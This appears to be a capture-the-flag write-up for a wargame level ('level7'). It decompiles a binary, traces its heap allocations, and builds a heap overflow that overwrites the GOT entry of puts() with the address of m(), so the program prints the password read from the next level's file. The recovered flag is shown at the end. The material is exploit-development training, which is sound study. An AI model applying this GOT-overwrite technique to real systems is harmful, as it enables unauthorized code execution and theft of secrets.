```C
int32_t m()
{
    return printf("%s - %d\n", &c, time(nullptr));
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    int32_t *eax = malloc(8);
    *eax = 1;

    eax[1] = malloc(8);

    int32_t* eax_4 = malloc(8);
    *eax_4 = 2;

    eax_4[1] = malloc(8);
    
    strcpy(eax[1], argv[1]);    // eax[1]   = 0x0804a018
    strcpy(eax_4[1], argv[2]);  // eax_4[1] = 0x0804a038

    fgets(&c, 0x44, fopen("/home/user/level8/.pass", u"r…"));
    puts("~~");
    return 0;
}
```

- Address of puts() in GOT = 0x08049928
- Address of m()           = 0x080484f4
- eax is actually a struct that looks like:

---

```C
struct x
{
    int32_t num;
    char    *str;
}
```

--- 

(2 Structs of size 8)

eax = 0x0804a008
- eax->num   = 1;
- eax->str   = malloc(8);    (0x0804a018)

eax_4
- eax_4->num = 2;
- eax_4->str = malloc(8);  (0x0804a038)

What is the offset eax[1] until reaching eax_4[1] ?

Let's try;

```C
> ltrace ./level7 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ test

malloc(8)                                             = 0x0804a008
malloc(8)                                             = 0x0804a018
malloc(8)                                             = 0x0804a028
malloc(8)                                             = 0x0804a038
strcpy(0x0804a018, "abcdefghijklmnopqrstuvwxyzABCDEF"...) = 0x0804a018
strcpy(0x78777675, "test" <unfinished ...>)

```

0x78777675 = xwvu (in ascii)
-> So we know that we are writing on eax_4[1] after the letter t so 20 bytes.
-> then let's put the address of puts() in GOT into eax_4[1].
-> We just have to replace the address of puts by the address of m() with the second strcpy() and the address will be replace and puts() will call m().

```
argv[1] = 20 * "A" + 0x08049928
argv[2] = 0x080484f4

python3 exploit.py
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```